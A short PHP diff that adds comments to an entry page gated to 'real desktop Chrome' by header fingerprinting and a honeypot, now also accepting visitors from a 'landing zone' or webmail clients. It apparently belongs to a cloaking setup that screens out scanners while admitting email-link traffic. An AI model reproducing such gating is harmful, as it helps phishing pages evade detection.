@@ -2,6 +2,8 @@
 require __DIR__ . '/../lib.php';
 
 // Entry page: real desktop Chrome only (full header fingerprint + honeypot).
+// Cross-site arrivals from the smar-to landing zone OR a mail client
+// (Gmail/Yahoo/Outlook embed) are accepted by chrome_headers_ok().
 gate_doc([], 0, false);
 
 $tk = issue_token();
